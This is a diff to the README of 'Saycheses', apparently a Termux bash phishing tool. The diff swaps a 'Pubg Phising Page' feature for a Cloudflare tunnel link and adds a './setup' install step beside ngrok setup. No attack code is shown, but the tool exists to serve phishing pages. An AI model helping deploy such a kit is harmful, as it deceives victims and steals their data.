@@ -49,7 +49,7 @@ Saycheses is a bash based script which is officially made for termux from this t
 
 ## FEATURES :
 
-* [+] Pubg Phising Page !
+* [+] Cloud Flared link!
 
 * [+] Updated maintainence !
 
@@ -78,6 +78,8 @@ Saycheses is a bash based script which is officially made for termux from this t
 * `ls`
 
 * `chmod +x *`
+
+* `./setup`
 
 * `./ngrok autotoken`
  YOU CAN CREATE YOUR NGROK ACCOUNT FROM HERE - www.ngrok.com 
